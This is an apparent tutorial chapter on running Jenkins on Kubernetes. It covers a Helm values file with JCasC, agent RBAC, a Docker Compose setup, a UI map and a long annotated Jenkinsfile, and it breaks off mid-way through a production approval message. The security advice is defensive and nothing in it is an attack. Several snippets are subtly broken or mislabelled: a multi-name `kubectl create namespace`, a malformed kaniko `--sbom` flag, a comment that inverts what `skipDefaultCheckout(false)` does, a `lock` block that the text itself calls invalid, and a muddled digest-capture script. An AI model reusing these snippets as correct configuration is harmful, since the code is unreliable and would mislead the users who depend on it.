# 🔨 CASE 3 — Jenkins: Pipelines End to End

> **Run a production-grade Jenkins**: installed on Kubernetes with the Helm chart, configured entirely from code with JCasC, running every build in a **dynamically-created Kubernetes pod agent** that dies when the job finishes, with a Groovy **shared library** providing the reusable layer, a **multibranch pipeline** that discovers PRs automatically, credentials scoped per folder, an `input` approval gate plus Lockable Resources for the production mutex, and OIDC federation so no long-lived cloud key ever touches Jenkins.
>
> **Time:** 8–10 hours (Jenkins is the deepest of the three) · **Level:** beginner → confident
> **Prereq:** [01-CICD-GUIDE.md](./01-CICD-GUIDE.md) §1–§4, §6, §12 read. A Kubernetes cluster (kind is fine).
> **Jenkins LTS used here:** **2.568.3** (the LTS line as of September 2026). ⚠️ **Java 21 is the minimum runtime** — Java 17 support was dropped in the 2.555 line.

---

## What you'll have at the end

```
✅ Jenkins LTS running in Kubernetes, installed with the official Helm chart
✅ Jenkins Configuration as Code (JCasC) — the whole controller config in Git
✅ A dynamically-provisioned Kubernetes pod agent per job, with a Kaniko sidecar
✅ Zero persistent agent state: every build gets a fresh pod that is destroyed after
✅ A declarative Jenkinsfile for the shop app: lint → parallel tests → build → deploy
✅ A Groovy shared library with vars/, src/, resources/ and its own tests
✅ A multibranch pipeline that auto-discovers branches AND pull requests
✅ Credentials: scoped to folders, injected via withCredentials, never in the log
✅ OIDC federation to AWS/Azure/GCP — Jenkins as a workload identity provider
✅ An `input` approval gate with a submitter group, and a timeout that fails safely
✅ Lockable Resources for the production deploy mutex
✅ Blue Ocean / Pipeline Graph view, build timeline, and the Blue Ocean editor
✅ The essential plugin list, and how to manage plugin updates safely
✅ Jenkins backup (JENKINS_HOME), upgrade procedure, and HA considerations
✅ Script Console mastery — and why it's the most dangerous thing in Jenkins
✅ 30+ troubleshooting recipes for the failures that actually happen
✅ 5 hands-on tasks with full worked answers
```

---

## 0 · Installing Jenkins

### 0.1 The four ways to run it — pick one

| Method | For | Verdict |
|---|---|---|
| ⭐ **Helm chart on Kubernetes** | production, and this case | The real answer. Dynamic pod agents, JCasC, upgrades via Helm. |
| `docker run` / `docker compose` | a weekend of learning | Fine for §1–§7, but you'll hit the DinD wall. |
| A WAR on a VM (`java -jar jenkins.war`) | a legacy shop you're inheriting | Understand it, don't choose it. |
| A Linux package (`apt install jenkins`) | a small team with one VM | Acceptable; you manage Java, upgrades and backups yourself. |

### 0.2 The Kubernetes install ⭐ (what we'll use)

```bash
# ── 0. the cluster ───────────────────────────────────────────────
cat > ~/shop/ci/kind.yaml <<'EOF'
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
name: cicd
nodes:
  - role: control-plane
    extraPortMappings:
      - {containerPort: 30080, hostPort: 80}
      - {containerPort: 30443, hostPort: 443}
      - {containerPort: 31080, hostPort: 8080}   # ⭐ Jenkins itself
  - role: worker
  - role: worker
EOF
kind create cluster --config ~/shop/ci/kind.yaml --wait 5m
kubectl create namespace jenkins shop monitoring

# ── 1. the chart ─────────────────────────────────────────────────
helm repo add jenkinsci https://charts.jenkins.io
helm repo update
helm search repo jenkinsci/jenkins -l | head -5
# jenkinsci/jenkins   5.x.x    2.568.3    ⭐ the chart version → the Jenkins LTS version

# ── 2. ⭐ the values file — this is JCasC, see §10 for the full version
mkdir -p ~/shop/ci/jenkins && cd ~/shop/ci/jenkins
cat > values.yaml <<'EOF'
# ═══════════════════════════════════════════════════════════════════
controller:
  image:
    registry: docker.io
    repository: jenkins/jenkins
    tag: "2.568.3-lts"            # ⭐⭐ PINNED. Never `latest`.
  # ⭐ Java 21 is the minimum for 2.555+. The image ships it.
  resources:
    requests: {cpu: "1", memory: 2Gi}
    limits:   {cpu: "2", memory: 4Gi}
  javaOpts: >-
    -XX:+UseContainerSupport
    -XX:MaxRAMPercentage=75.0
    -Djenkins.install.runSetupWizard=false
    -Dhudson.model.DirectoryBrowserSupport.CSP="sandbox allow-scripts; default-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline';"
    -Djava.awt.headless=true
    -Dhudson.footerURL=https://jenkins.shop.example.com
  installPlugins:                 # ⭐⭐ the plugin list IS the config. Pinned versions.
    - kubernetes:4333.v37a_1a_f6d5b_a_1     # ⭐ dynamic pod agents
    - workflow-aggregator:608.v67378e9d3db_1
    - configuration-as-code:1932.v79cb_1a_b_f1c9f7
    - job-dsl:1.89
    - git:5.7.0
    - github:1.41.0
    - github-branch-source:1826.v25e5c1e2f6a_c
    - pipeline-github-lib:65.v20ea_610a_11cc
    - credentials-binding:687.v619cb_57e983f
    - plain-credentials:189.va_6a_dd1c1a_4c4
    - ssh-credentials:355.v9b_e5b_cde5003
    - lockable-resources:1385.v089dd83a_b_a_11
    - blueocean:1.27.17
    - timestamper:1.27
    - ws-cleanup:0.47
    - antisamy-markup-formatter:162.v0e6ec0fcfcf6
    - dark-theme:524.vd675b_22b_3a_cb_
    - rebuild:332.va_1ee476d8f6d
    - parameterized-trigger:861.v8b_6a_8e6c9d92
    - throttle-concurrents:2.15
    - build-timeout:1.33
    - naginator:1.240.v41b_f4f9b_7c6a
    - junit:1333.vf209c24d8b_0f
    - cobertura:1.17
    - htmlpublisher:1.38
    - warnings-ng:11.6.v1b_c46a_0d3c0d
    - checks-api:661.v8f9b_f0a_1d6d5
    - echarts-api:6.3.3-2.v41b_1f0b_5c6a_
    - script-security:1373.vb_e1b_f3e1f5b_a_
    - matrix-auth:3.2.5
    - role-strategy:747.vc8b_2a_4b_1a_9f3
    - authorize-project:2.0.0
    - oidc-provider:2.5            # ⭐⭐ Jenkins AS an OIDC provider (§4.6)
    - hashicorp-vault-plugin:3.21.0 # ⭐ Vault integration
    - aws-credentials:267.vc17a_f26ea_6a_c
    - azure-credentials:331.vb_a_6c4d7d9f5a_
    - google-oauth-plugin:1.0.20
    - docker-workflow:583.vf0b_3a_25e4f2f
    - docker-plugin:1.7.1
    - pipeline-stage-view:2.37
    - basic-branch-build-strategies:107.vb_b_a_1c8c4b_3e4
    - branch-api:2.1222.vb_6c6c4a_6e6b_a_
    - cloudbees-folder:6.974.v0ee0b_e0b_0d1a_
    - scm-api:704.v3ce5c542825a_
    - trilead-api:2.207.vf4b_e6f1465d1
  # ⭐ install additional plugins from a private update center or a baked image
  installLatestSpecifiedPlugins: false
  installLatestPlugins: false      # ⭐⭐ NEVER auto-latest in production
  overwritePlugins: false
  # ⭐ the admin secret
  admin:
    existingSecret: jenkins-admin-secret    # created below
    userKey: jenkins-admin-user
    passwordKey: jenkins-admin-password
  # ⭐ the JCasC config, mounted as a ConfigMap from `controller.JCasC`
  JCasC:
    defaultConfig: true
    configScripts: {}              # we use the structured `jenkins:` block below
    securityRealm: |-
      local:
        allowsSignup: false
        users:
          - id: "${chart-admin-username}"
            password: "${chart-admin-password}"
    authorizationStrategy: |-
      roleBased:
        roles:
          global:
            - name: "admin"
              permissions: ["Overall/Administer"]
              entries: ["harish"]
            - name: "developer"
              permissions: ["Overall/Read","Job/Read","Job/Build","Job/Workspace","Job/Cancel","View/Read"]
              entries: ["developers"]
            - name: "sre"
              permissions: ["Overall/Read","Job/Read","Job/Build","Job/Configure","Job/Cancel","Run/Update","View/Read","Credentials/View"]
              entries: ["sre-team"]
            - name: "anonymous"
              permissions: []
              entries: ["anonymous"]
  # ⭐ the service and the ingress
  serviceType: ClusterIP
  servicePort: 8080
  ingress:
    enabled: true
    apiVersion: networking.k8s.io/v1
    hostName: jenkins.shop.example.com
    annotations:
      nginx.ingress.kubernetes.io/proxy-body-size: "50m"
      nginx.ingress.kubernetes.io/proxy-read-timeout: "3600"   # ⭐ long builds
      cert-manager.io/cluster-issuer: letsencrypt-prod
    tls:
      - secretName: jenkins-tls
        hosts: [jenkins.shop.example.com]
  # ⭐ the root URL — set it or every link in an email is wrong
  jenkinsUrl: https://jenkins.shop.example.com
  jenkinsUriPrefix: ""
  # ⭐ the CSRF crumb and the CLI
  disableSecretMount: false

# ═══════════════════════════════════════════════════════════════════
# ⭐⭐ THE AGENT CONFIGURATION — the Kubernetes cloud
agent:
  enabled: true
  defaultsProviderTemplate: ""       # ⭐ a named pod template for `label ''`
  podName: shop-agent
  namespace: jenkins
  image:
    repository: jenkins/inbound-agent
    tag: "3313.vf6a_8b_1f0c4d1-1-jdk21"
  privileged: false                  # ⭐⭐ NEVER true
  resources:
    requests: {cpu: 500m, memory: 1Gi}
    limits:   {cpu: "2", memory: 4Gi}
  TTYEnabled: true
  workspaceVolume:
    type: EmptyDir
    memory: false
  # ⭐ pod templates defined declaratively (the alternative to JCasC below)
  podTemplates: {}

# ⭐ persistence for JENKINS_HOME
persistence:
  enabled: true
  size: 20Gi
  storageClass: standard
  accessMode: ReadWriteOnce          # ⭐ RWO — Jenkins does NOT do HA on a shared volume
  annotations: {}
  # ⭐ snapshots for backup
  # volumeSnapshotName: jenkins-snap

networkPolicy:
  enabled: true
  apiVersion: networking.k8s.io/v1
  internalAgents:
    allowed: true
    podLabels: {app.kubernetes.io/instance: jenkins}
  externalAgents: {}

rbac:
  create: true
  readSecrets: false                 # ⭐ the agent's RBAC should NOT read cluster secrets

serviceAccount:
  create: true
  name: jenkins
  automountServiceAccountToken: true

serviceAccountAgent:
  create: true
  name: jenkins-agent
  automountServiceAccountToken: false  # ⭐⭐ agents do NOT need cluster API access

# ⭐ the backup cronjob
backup:
  enabled: false                     # ⭐ use Velero or a CronJob instead — see §11.4
EOF

# ── 3. the admin secret ──────────────────────────────────────────
kubectl -n jenkins create secret generic jenkins-admin-secret \
  --from-literal=jenkins-admin-user=admin \
  --from-literal=jenkins-admin-password="$(openssl rand -base64 24)" \
  --dry-run=client -o yaml | kubectl apply -f -
kubectl -n jenkins get secret jenkins-admin-secret -o jsonpath='{.data.jenkins-admin-password}' \
  | base64 -d && echo

# ── 4. ⭐ the RBAC the controller needs to create agent pods ─────
cat > rbac-agents.yaml <<'EOF'
apiVersion: v1
kind: ServiceAccount
metadata: {name: jenkins-agent-creator, namespace: jenkins}
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata: {name: jenkins-agent-creator, namespace: jenkins}
rules:
  # ⭐⭐ SCOPED TO THE jenkins NAMESPACE ONLY. Never cluster-wide.
  - apiGroups: [""]
    resources: [pods, pods/log, pods/exec]
    verbs: [get, list, watch, create, update, patch, delete]
  - apiGroups: [""]
    resources: [secrets, configmaps, serviceaccounts, persistentvolumeclaims]
    verbs: [get, list, watch, create, update, patch, delete]
  - apiGroups: [""]
    resources: [events]
    verbs: [list, watch]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata: {name: jenkins-agent-creator, namespace: jenkins}
roleRef: {apiGroup: rbac.authorization.k8s.io, kind: Role, name: jenkins-agent-creator}
subjects: [{kind: ServiceAccount, name: jenkins, namespace: jenkins}]
EOF
kubectl apply -f rbac-agents.yaml

# ⭐ PROVE the scope — the controller must NOT be able to read shop secrets
kubectl -n jenkins auth can-i create pods --as=system:serviceaccount:jenkins:jenkins    # yes ✅
kubectl -n jenkins auth can-i get secrets --as=system:serviceaccount:jenkins:jenkins     # yes (it needs them)
kubectl -n shop    auth can-i get secrets --as=system:serviceaccount:jenkins:jenkins     # ⭐ NO ✅
kubectl -n shop    auth can-i create pods  --as=system:serviceaccount:jenkins:jenkins    # ⭐ NO ✅
kubectl            auth can-i list nodes    --as=system:serviceaccount:jenkins:jenkins    # ⭐ NO ✅

# ── 5. install ───────────────────────────────────────────────────
helm upgrade --install jenkins jenkinsci/jenkins \
  -n jenkins --create-namespace \
  --values values.yaml \
  --wait --timeout 10m --atomic

kubectl -n jenkins get pods -w
kubectl -n jenkins logs sts/jenkins -c jenkins --tail=50 | grep -iE 'fully up and running|SEVERE|WARNING'

# ── 6. reach it ──────────────────────────────────────────────────
kubectl -n jenkins port-forward svc/jenkins 8080:8080 &
open http://localhost:8080        # user: admin, password: from the secret above
# or with the ingress:
kubectl -n ingress-nginx get ingress jenkins
```

### 0.3 The Docker install (for §1–§7 only)

```bash
# ⭐ docker compose — the simplest way to have Jenkins + a Docker-capable agent
cat > docker-compose.yaml <<'EOF'
services:
  jenkins:
    image: jenkins/jenkins:2.568.3-lts        # ⭐ PINNED
    container_name: jenkins
    restart: unless-stopped
    ports:
      - "8080:8080"
      - "50000:50000"                          # ⭐ the agent JNLP/inbound port
    environment:
      JAVA_OPTS: >-
        -Djenkins.install.runSetupWizard=true
        -Dhudson.model.DirectoryBrowserSupport.CSP=
        -XX:MaxRAMPercentage=75
      JENKINS_OPTS: "--prefix=/jenkins"
      CASC_JENKINS_CONFIG: /var/jenkins_home/casc.yaml
    volumes:
      - jenkins_home:/var/jenkins_home
      - ./casc.yaml:/var/jenkins_home/casc.yaml:ro
      - jenkins_plugins:/var/jenkins_home/plugins
      # ⭐⛔ mounting the Docker socket gives the build FULL ROOT ON THE HOST.
      #    Acceptable ONLY on a throwaway laptop VM. Never on a shared machine.
      - /var/run/docker.sock:/var/run/docker.sock
    healthcheck:
      test: ["CMD-SHELL", "curl -sf http://localhost:8080/login >/dev/null"]
      interval: 15s
      timeout: 5s
      retries: 20
      start_period: 90s

volumes:
  jenkins_home:
  jenkins_plugins:
EOF

docker compose up -d
docker compose logs -f jenkins | grep -m1 "fully up and running"
docker compose exec jenkins cat /var/jenkins_home/secrets/initialAdminPassword
open http://localhost:8080
```

### 0.4 The first ten minutes in the UI

```
http://localhost:8080
  → ⭐ "Install suggested plugins" — for a THROWAWAY. In production use JCasC (§10).
  → create the admin user
  → set the Jenkins URL  ⭐⭐ (if this is wrong, every email/link is wrong forever)
  → Dashboard

THE UI MAP
  Dashboard
    ├─ New Item                    → Freestyle | ⭐ Pipeline | Multibranch Pipeline | Folder
    ├─ Manage Jenkins              → ⭐⭐ EVERYTHING IMPORTANT IS HERE
    │    ├─ System                 → the global config (JCasC's `jenkins:` block)
    │    ├─ Tools                  → JDK, Maven, Git, Docker installations
    │    ├─ Plugins                → ⭐ available / installed / updates
    │    ├─ Nodes                  → ⭐ the built-in node + any agents
    │    ├─ Credentials            → ⭐⭐ the credential store, scoped by domain/folder
    │    ├─ Manage Users           → (or your LDAP/OIDC realm)
    │    ├─ Security               → ⭐⭐ Authorization strategy, CSRF, agents, CLI
    │    ├─ System Log             → all logs, and ⭐ you can add a logger per package
    │    ├─ Script Console         → ⚠️⛔ Groovy with FULL ADMIN. The most dangerous page.
    │    ├─ Configuration as Code  → ⭐ view/reload/validate the JCasC YAML
    │    ├─ Global Tool Configuration
    │    ├─ In-process Script Approval  → ⭐ approve Groovy methods the sandbox blocked
    │    ├─ Manage Nodes and Clouds → ⭐ the Kubernetes cloud config
    │    └─ Backup / Reload Configuration from Disk
    ├─ Build History               (left)
    └─ ⭐ Blue Ocean (if installed) → /blue — the modern pipeline editor and graph view

⭐ THE THREE KEYBOARD SHORTCUTS WORTH KNOWING
  Ctrl+/        the command palette (find anything)
  Alt+Shift+P   … (depends on the theme)
  the "?" icon  contextual help on EVERY field — Jenkins' documentation is inline
```

---

## 1 · The Jenkinsfile — declarative pipeline anatomy

### 1.1 The whole structure, annotated

```groovy
// Jenkinsfile  ⭐ declarative syntax (not scripted — see §1.2)
// ═══════════════════════════════════════════════════════════════════

// ── GLOBAL DIRECTIVES (must come first, before `pipeline`) ───────
@Library('shop-shared@v2') _          // ⭐⭐ load the shared library. `_` = discard the return.
                                      //    PINNED to a tag. Never `@master`.

import groovy.json.JsonOutput
import groovy.json.JsonSlurper
import java.time.Instant

// ── the build-discarder, the quiet period, the cron ─────────────
properties([
  pipelineTriggers([
    // ⭐ the SCM poll — only needed if you can't use a webhook
    pollSCM('H/5 * * * *'),            // ⭐⭐ `H` = hash-based jitter, spreads the load
    cron('H 2 * * 1-5'),               // ⭐ a nightly build at ~02:00 (jittered)
    upstream(upstreamProjects: 'shop-infra', threshold: hudson.model.Result.SUCCESS),
  ]),
  buildDiscarder(logRotator(
    numToKeepStr: '50',                // ⭐⭐ keep the last 50 builds
    daysToKeepStr: '90',               // ⭐ and anything older than 90 days goes
    artifactNumToKeepStr: '10',
    artifactDaysToKeepStr: '30'
  )),
  disableConcurrentBuilds(),           // ⭐⭐ the mutex — one build at a time
  skipDefaultCheckout(false),          // ⭐ false = YOU decide when to check out
  durabilityHint('PERFORMANCE_OPTIMIZED'),  // ⭐⭐ fewer disk writes; the log may lose
                                       //    data if the controller crashes mid-build
  [$class: 'GithubProjectProperty', projectUrlStr: 'https://github.com/3558Bhk/shop/'],
  parameters([
    choice(name: 'ENVIRONMENT', choices: ['dev', 'staging', 'production'],
           description: '🌍 The target environment'),
    string(name: 'IMAGE_TAG', defaultValue: '', description: 'Override the image tag'),
    booleanParam(name: 'SKIP_TESTS', defaultValue: false, description: '⚠️ Emergencies only'),
    booleanParam(name: 'DRY_RUN', defaultValue: false),
    text(name: 'DEPLOY_NOTES', defaultValue: '', description: 'Shown to the approver'),
    credentials(name: 'EXTRA_CREDS', credentialType: 'com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials',
                description: 'An optional credential override'),
  ]),
])

// ═══════════════════════════════════════════════════════════════════
pipeline {

  // ── the agent: where the WHOLE pipeline runs by default ────────
  agent {
    kubernetes {                       // ⭐⭐ a DYNAMIC POD — see §3
      label "shop-${env.BUILD_NUMBER}"          // ⭐ unique per build
      defaultContainer 'jnlp'                   // ⭐ the container steps run in by default
      yaml """
apiVersion: v1
kind: Pod
metadata:
  labels:
    jenkins-agent: shop
    build: "${env.BUILD_NUMBER}"
spec:
  serviceAccountName: jenkins-agent
  automountServiceAccountToken: false   # ⭐⭐ no cluster API access
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    fsGroup: 1000
    seccompProfile: {type: RuntimeDefault}
  containers:
    - name: jnlp                        # ⭐⭐ REQUIRED — the inbound-agent container
      image: jenkins/inbound-agent:3313.vf6a_8b_1f0c4d1-1-jdk21
      resources:
        requests: {cpu: 250m, memory: 512Mi}
        limits:   {cpu: "1", memory: 2Gi}
      securityContext:
        privileged: false
        allowPrivilegeEscalation: false
        capabilities: {drop: ["ALL"]}
        readOnlyRootFilesystem: false
    - name: java
      image: eclipse-temurin:21-jdk-jammy
      command: ['sleep']
      args: ['infinity']                # ⭐⭐ keeps the container alive so `container('java')` works
      resources:
        requests: {cpu: 500m, memory: 1Gi}
        limits:   {cpu: "2", memory: 4Gi}
      env:
        - {name: MAVEN_OPTS, value: "-Xmx2g -XX:+UseG1GC"}
    - name: docker
      image: docker:27-cli
      command: ['sleep']
      args: ['infinity']
      tty: true
    - name: kaniko                      # ⭐⭐ build images WITHOUT a Docker daemon
      image: gcr.io/kaniko-project/executor:v1.23.2-debug
      command: ['sleep']
      args: ['infinity']
      env:
        - {name: DOCKER_CONFIG, value: /home/jenkins/.docker}
    - name: tools
      image: alpine/helm:3.16.2
      command: ['sleep']
      args: ['infinity']
  volumes:
    - name: workdir
      emptyDir: {sizeLimit: 10Gi}       # ⭐ a bounded ephemeral workspace
    - name: gradle-cache
      emptyDir: {}
  nodeSelector: {kubernetes.io/os: linux}
  tolerations: []
  affinity:
    podAntiAffinity:
      preferredDuringSchedulingIgnoredDuringExecution:
        - weight: 100
          podAffinityTerm:
            topologyKey: kubernetes.io/hostname
            labelSelector:
              matchLabels: {jenkins-agent: shop}
"""
    }
  }

  // ── global environment ────────────────────────────────────────
  environment {
    REGISTRY        = 'ghcr.io/3558bhk'
    NAMESPACE       = 'shop'
    HELM_RELEASE    = 'shop'
    CHART_PATH      = 'helm/shop'
    GO_VERSION      = '1.23'
    JAVA_TOOL_OPTIONS = '-XX:+UseContainerSupport -XX:MaxRAMPercentage=75'
    // ⭐⭐ CREDENTIALS — bound ONCE, available everywhere, masked in every log
    GHCR_CREDS      = credentials('ghcr-token')      // → GHCR_CREDS, GHCR_CREDS_USR, GHCR_CREDS_PSW
    KUBECONFIG      = credentials('kubeconfig-staging')
    // ⭐ computed at parse time:
    SHORT_SHA       = "${env.GIT_COMMIT?.take(7) ?: 'unknown'}"
    IMAGE_TAG       = "${params.IMAGE_TAG ?: env.GIT_COMMIT ?: env.BUILD_NUMBER}"
    BUILD_URL_LINK  = "${env.BUILD_URL}"
    SLACK_WEBHOOK   = credentials('slack-webhook')
  }

  // ── global options ────────────────────────────────────────────
  options {
    timestamps()                        // ⭐ every log line gets a timestamp
    timeout(time: 90, unit: 'MINUTES')  // ⭐⭐ ALWAYS. A hung build holds an agent forever.
    buildDiscarder(logRotator(numToKeepStr: '50', daysToKeepStr: '90'))
    disableConcurrentBuilds()           // ⭐ the mutex for THIS job
    skipDefaultCheckout(true)           // ⭐⭐ WE control checkout — see the Checkout stage
    ansiColor('xterm')                  // ⭐ colour in the console log
    preserveStashes(buildCount: 5)      // ⭐ keep stashes for later inspection
    parallelsAlwaysFailFast()           // ⭐ a failure in one parallel branch kills the others
    quietPeriod(10)                     // ⭐ debounce rapid pushes
    checkoutToSubdirectory('src')       // ⭐ or a specific dir
    newContainerPerStage()              // ⭐⭐ a FRESH container per stage (isolation)
    // ⭐ the retry-with-backoff wrapper for the whole pipeline is NOT an option;
    //    use `retry()` inside a stage, or the Naginator plugin.
  }

  // ── the stages ────────────────────────────────────────────────
  stages {

    stage('🔍 Checkout') {
      agent any
      steps {
        // ⭐⭐ EXPLICIT checkout — because skipDefaultCheckout(true)
        checkout scmGit(
          branches: scm.branches,
          extensions: [
            cleanBeforeCheckout(),
            cloneOption(depth: 1, shallow: true, noTags: false, timeout: 20),
            // ⭐ the changelog and the committer info
            [$class: 'BuildChooserSetting', buildChooser: [$class: 'DefaultBuildChooser']]
          ],
          userRemoteConfigs: scm.userRemoteConfigs
        )
        script {
          // ⭐ the build metadata every later stage uses
          env.GIT_SHA_FULL = sh(returnStdout: true, script: 'git rev-parse HEAD').trim()
          env.GIT_BRANCH   = sh(returnStdout: true, script: 'git rev-parse --abbrev-ref HEAD').trim()
          env.GIT_AUTHOR   = sh(returnStdout: true, script: 'git log -1 --pretty=%an').trim()
          env.GIT_SUBJECT  = sh(returnStdout: true, script: 'git log -1 --pretty=%s').trim()
          // ⭐⭐ set the build's display name and description
          currentBuild.displayName = "#${env.BUILD_NUMBER} · ${env.GIT_BRANCH} · ${env.GIT_SHA_FULL.take(7)}"
          currentBuild.description   = "${env.GIT_SUBJECT}\nby ${env.GIT_AUTHOR}"
          // ⭐ a machine-readable metadata file
          writeFile file: 'build-info.json', text: JsonOutput.prettyPrint(JsonOutput.toJson([
            buildNumber: env.BUILD_NUMBER.toInteger(),
            buildUrl: env.BUILD_URL,
            jobName: env.JOB_NAME,
            revision: env.GIT_SHA_FULL,
            branch: env.GIT_BRANCH,
            author: env.GIT_AUTHOR,
            subject: env.GIT_SUBJECT,
            startedAt: Instant.now().toString(),
            triggeredBy: currentBuild.getBuildCauses().toString()
          ]))
          archiveArtifacts artifacts: 'build-info.json', fingerprint: true
        }
      }
    }

    stage('🧹 Lint') {
      steps {
        sh '''
          set -euo pipefail
          echo "==> shellcheck"
          find . -name '*.sh' -not -path './node_modules/*' -exec shellcheck -x {} +
          echo "==> yamllint"
          yamllint -d "{extends: relaxed}" helm/ k8s/ || true
          echo "==> kubeconform"
          kubeconform -strict -summary k8s/ || echo "  (kubeconform unavailable)"
        '''
      }
      post {
        always { echo "lint finished" }
      }
    }

    stage('🧪 Test') {
      when {
        not { expression { params.SKIP_TESTS } }     // ⭐ the escape hatch
      }
      parallel {                                     // ⭐⭐ the matrix equivalent
        stage('shop-api') {
          steps {
            container('java') {                      // ⭐ run in the java container
              dir('apps/shop-api') {
                sh './mvnw -B -T 1C verify'
              }
            }
          }
          post {
            always {
              junit testResults: 'apps/shop-api/target/surefire-reports/TEST-*.xml',
                    allowEmptyResults: false, keepLongStdio: true,
                    healthScaleFactor: 2.0, skipPublishingChecks: false
              recordCoverage(tools: [[parser: 'JACOCO', pattern: 'apps/shop-api/target/site/jacoco/jacoco.xml']],
                             id: 'shop-api-coverage', name: 'shop-api coverage',
                             unhealthyCoverage: 70, failingCoverage: 50)
            }
          }
        }
        stage('checkout') {
          steps {
            container('tools') {
              dir('apps/checkout') {
                sh '''
                  set -euo pipefail
                  go mod download
                  go test ./... -race -count=1 -coverprofile=cover.out -covermode=atomic \
                    | tee test-output.txt
                  go tool cover -func=cover.out | tail -1
                '''
              }
            }
          }
          post {
            always {
              // ⭐ Go produces no JUnit XML by default — use gotestsum
              junit 'apps/checkout/junit.xml'
              archiveArtifacts 'apps/checkout/cover.out', allowEmptyArchive: true
            }
          }
        }
        stage('order-worker') {
          steps {
            container('tools') {
              dir('apps/order-worker') {
                sh '''
                  set -euo pipefail
                  python3 -m venv .venv && . .venv/bin/activate
                  pip install -q -r requirements.txt -r requirements-dev.txt
                  ruff check . && ruff format --check .
                  pytest -n auto --junitxml=junit.xml --cov --cov-report=xml --cov-report=term
                '''
              }
            }
          }
          post { always { junit 'apps/order-worker/junit.xml' } }
        }
        stage('shop-ui') {
          steps {
            container('tools') {
              dir('apps/shop-ui') {
                sh '''
                  set -euo pipefail
                  npm ci --prefer-offline --no-audit --no-fund
                  npm run lint
                  npm run test -- --run --coverage --reporter=junit --outputFile=junit.xml
                  npm run build
                '''
              }
            }
          }
          post { always { junit 'apps/shop-ui/junit.xml' } }
        }
      }
      post {
        always {
          // ⭐ the aggregated coverage report
          publishHTML(target: [
            reportDir: 'apps/shop-api/target/site/jacoco',
            reportFiles: 'index.html',
            reportName: 'Coverage report',
            keepAll: true, allowMissing: true, alwaysLinkToLastBuild: true
          ])
        }
      }
    }

    stage('🏗️ Build images') {
      when {
        allOf {
          branch 'main'                              // ⭐ only on main
          not { changeRequest() }                    // ⭐ not on a PR
        }
      }
      steps {
        // ⭐⭐ KANIKO — build an image with NO Docker daemon and NO privileged mode
        container('kaniko') {
          script {
            def services = ['shop-api', 'checkout', 'order-worker', 'shop-ui', 'payment-mock']
            def digests = [:]
            // ⭐ a real parallel map, collecting results
            def branches = services.collectEntries { svc ->
              ["build-${svc}", {
                def image = "${env.REGISTRY}/${svc}"
                def tag   = "${env.GIT_SHA_FULL}"
                sh """
                  set -euo pipefail
                  /kaniko/executor \\
                    --context "dir://${env.WORKSPACE}/apps/${svc}" \\
                    --dockerfile "${env.WORKSPACE}/apps/${svc}/Dockerfile" \\
                    --destination "${image}:${tag}" \\
                    --destination "${image}:latest" \\
                    --cache=true --cache-repo="${env.REGISTRY}/${svc}-cache" \\
                    --cache-copy-layers=true --cache-ttl=168h \\
                    --compressed-caching=false \\
                    --snapshot-mode=redo \\
                    --use-new-run \\
                    --label "org.opencontainers.image.revision=${tag}" \\
                    --label "org.opencontainers.image.source=https://github.com/3558Bhk/shop" \\
                    --label "org.opencontainers.image.created=\$(date -u +%FT%TZ)" \\
                    --build-arg VERSION=${tag} \\
                    --build-arg BUILD_SHA=${tag} \\
                    --build-arg JENKINS_BUILD=${env.BUILD_NUMBER} \\
                    --sbom= cyclonedx \\
                    --reproducible \\
                    --verbosity=info
                """
                // ⭐⭐ capture the digest — kaniko prints it
                def digest = sh(returnStdout: true, script: """
                  crane digest "${image}:${tag}" 2>/dev/null || \\
                  /kaniko/executor --version >/dev/null; echo "\$(crane digest ${image}:${tag})"
                """).trim().readLines().last()
                digests[svc] = digest
                writeFile file: "${env.WORKSPACE}/digests/${svc}.txt", text: digest
              }]
            }
            parallel branches
            // ⭐ stash the digests for the deploy stage
            dir('digests') { stash name: 'digests', includes: '*.txt' }
          }
        }
      }
    }

    stage('🛡️ Scan and sign') {
      when { branch 'main' }
      steps {
        container('tools') {
          sh '''
            set -euo pipefail
            for svc in shop-api checkout order-worker shop-ui payment-mock; do
              D=$(cat digests/$svc.txt)
              IMAGE="$REGISTRY/$svc@$D"
              echo "==> scanning $svc"
              trivy image --exit-code 1 --severity CRITICAL --ignore-unfixed \
                --format table "$IMAGE" || { echo "⛔ $svc has a CRITICAL CVE"; exit 1; }
              trivy image --format cyclonedx --output "reports/$svc.sbom.cdx.json" "$IMAGE"
              echo "==> signing $svc"
              cosign sign --yes "$IMAGE"
              cosign attest --yes --predicate "reports/$svc.sbom.cdx.json" --type cyclonedx "$IMAGE"
            done
          '''
        }
      }
      post {
        always {
          archiveArtifacts 'reports/**', allowEmptyArchive: true, fingerprint: true
          // ⭐ publish the Trivy findings into the Warnings NG plugin
          recordIssues(tools: [trivy(pattern: 'reports/trivy-*.json')],
                       healthy: 0, unhealthy: 10, minimumSeverity: 'HIGH')
        }
      }
    }

    stage('🌱 Deploy to dev') {
      when { branch 'main'; not { changeRequest() } }
      steps { deployTo('dev') }          // ⭐ a shared-library step — see §6
    }

    stage('🧪 Deploy to staging') {
      when { branch 'main'; not { changeRequest() } }
      steps { deployTo('staging') }
    }

    stage('🚀 Deploy to production') {
      when {
        allOf {
          branch 'main'
          expression { params.ENVIRONMENT == 'production' }
          // ⭐⭐ only if staging was deployed by THIS build
          expression { env.STAGING_DEPLOYED == 'true' }
        }
      }
      options {
        // ⭐⭐ the LOCK — Jenkins' answer to "one deploy at a time"
        lock(resource: "deploy-production", inversePrecedence: true, skipIfLocked: false) {
          // ⛔ NOT VALID HERE — `lock` is a step, not an option. See the steps below.
        }
      }
      steps {
        // ⭐⭐ 1. THE APPROVAL GATE
        script {
          def approvers = ['sre-team', 'release-managers']
          timeout(time: 4, unit: 'HOURS') {          // ⭐⭐ a timeout that FAILS SAFELY
            try {
              input message: """
🚀 PRODUCTION DEPLOYMENT

  Revision:   ${env.GIT_SHA_FULL.take(7)}
  Branch:     ${env.GIT_BRANCH}
  Commit:     ${env.GIT_SUBJECT}
  Author:     ${env.GIT_AUTHOR}
  Build:      ${env.BUILD_URL}
  Staging:    ${env.STAGING_URL ?: 'n/a'}

  Notes from the developer:
  ${params.DEPLOY_NOTES ?: '(none)'}

  ─────────────────────────────────────────────
  CHECKLIST — verify before approving:
